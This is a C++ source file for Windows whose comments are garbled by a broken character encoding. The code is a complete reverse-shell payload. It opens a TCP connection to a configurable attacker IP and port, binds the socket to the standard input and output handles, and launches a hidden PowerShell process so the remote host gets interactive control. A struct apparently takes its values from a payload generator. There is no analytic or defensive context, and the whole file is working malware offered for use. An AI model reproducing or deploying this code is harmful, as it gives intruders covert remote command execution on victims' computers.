// ���o�[�XTCP�ڑ���ʂ���powershell��D�悷��v���O�����ł�

#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <string>
#include <thread>
#include <chrono>

#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>

#pragma comment(lib, "ws2_32")

 // �y�C���[�h�W�F�l���[�^�[�œ��͂��󂯕t����l���i�[����\����
struct Arg {
    wchar_t ipAddress[255] = L"127.0.0.1"; // �U������IP�A�h���X
    wchar_t portStr[255] = L"4444"; // �|�[�g�ԍ�
} arg;


// �G���g���|�C���g
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

    // �|�[�g�ԍ��𕶎��񂩂�DWORD�ɕϊ�
    DWORD port = wcstoul(arg.portStr, nullptr, 10);

    // �\�P�b�g���C�u������������
    WSADATA socketData;
    WSAStartup(MAKEWORD(2, 2), &socketData);

    // �\�P�b�g�I�u�W�F�N�g���쐬
    SOCKET clientSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);

    // �ڑ���A�h���X�̐ݒ�
    struct sockaddr_in connectAddress;
    connectAddress.sin_family = AF_INET;
    connectAddress.sin_port = htons(port);
    InetPtonW(AF_INET, arg.ipAddress, &connectAddress.sin_addr);

    // �����[�g�z�X�g�ւ̐ڑ����m��
    connect(clientSocket, reinterpret_cast<SOCKADDR*>(&connectAddress), sizeof(connectAddress));

    // �v���Z�X�\���̂̏�����
    STARTUPINFO si = {};
    PROCESS_INFORMATION pi = {};

    // ���o�͂��\�P�b�g�Ƀ��_�C���N�g
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = reinterpret_cast<HANDLE>(clientSocket);
    si.hStdOutput = reinterpret_cast<HANDLE>(clientSocket);
    si.hStdError = reinterpret_cast<HANDLE>(clientSocket);

    // ���_�C���N�g���ꂽ�X�g���[���ŃV�F�����N��
    wchar_t shell[255] = L"powershell.exe"; // ���u���삷��V�F��
    CreateProcess(nullptr, shell, nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);

    // �I����ҋ@���ă��\�[�X�����
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(clientSocket);

    return 0;
}
